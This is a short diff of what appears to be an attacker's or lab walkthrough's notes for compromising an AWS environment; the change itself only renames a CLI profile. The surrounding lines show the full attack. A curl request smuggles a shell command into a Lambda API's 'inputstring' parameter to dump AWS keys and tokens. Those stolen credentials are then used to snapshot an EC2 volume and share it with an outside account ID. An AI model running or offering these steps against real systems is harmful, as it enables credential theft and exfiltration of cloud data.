@@ -2,7 +2,7 @@
 
 curl -s "https://a8spqqmetd.execute-api.us-east-1.amazonaws.com/prod?inputstring=1%3Bexport+%7C+grep+AWS+%7C+grep+AWS%3B+echo+1" | grep -e "KEY\|TOKEN" # gather AWS creds
 
-aws configure --profile lambdavuln
+aws configure --profile vulnlambda
 
 table
 
@@ -17,13 +17,13 @@ vi ec2_dump.txt
 
 ~~~ Get Snapshot ~~~
 
-aws ec2 create-snapshot --region us-east-2 --profile lambdavuln --volume-id "vol-0eabf084f016b3913" # create snapshot of a given target
+aws ec2 create-snapshot --region us-east-2 --profile vulnlambda --volume-id "vol-0eabf084f016b3913" # create snapshot of a given target
 
-aws ec2 describe-snapshots --region us-east-2 --profile lambdavuln --snapshot-ids snap-0daaac465901b9632 # check on snapshot progress
+aws ec2 describe-snapshots --region us-east-2 --profile vulnlambda --snapshot-ids snap-0daaac465901b9632 # check on snapshot progress
 
 aws sts get-caller-identity
 
-aws ec2 modify-snapshot-attribute --region us-east-2 --profile lambdavuln --snapshot-id snap-0daaac465901b9632 --attribute createVolumePermission --operation-type add --user-ids 480927147553
+aws ec2 modify-snapshot-attribute --region us-east-2 --profile vulnlambda --snapshot-id snap-0daaac465901b9632 --attribute createVolumePermission --operation-type add --user-ids 480927147553
 
 
 ~~~ Access Snapshot ~~~
